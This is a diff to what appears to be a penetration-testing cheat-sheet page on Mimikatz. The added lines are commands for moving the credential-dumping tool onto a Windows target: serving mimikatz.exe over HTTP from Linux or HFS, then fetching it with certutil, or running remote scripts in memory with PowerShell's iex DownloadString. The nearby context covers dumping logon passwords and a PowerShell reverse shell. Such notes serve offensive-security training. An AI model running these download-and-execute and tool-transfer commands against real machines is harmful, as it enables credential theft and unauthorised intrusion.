@@ -70,7 +70,27 @@ sekurlsa::logonpasswords
 ```
 {% endcode %}
 
+{% code title="Linux -> Windows Target" %}
+```bash
+ linux
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+python3 -m http.server 80 
 
+# Download files from windows target
+iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
+certutil -urlcache -f http://$IP/$FILE_NAME $LOCAL_FILE_NAME
+```
+{% endcode %}
+
+{% code title="Windows -> Windows Target" %}
+```powershell
+# Start a HTTP File Server (HFS) into a Windows machine with .exe
+# https://www.rejetto.com/hfs/
+
+# Download files from windows target
+iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
+```
+{% endcode %}
 
 ## MimiKatz into PowerShell RevShell
 
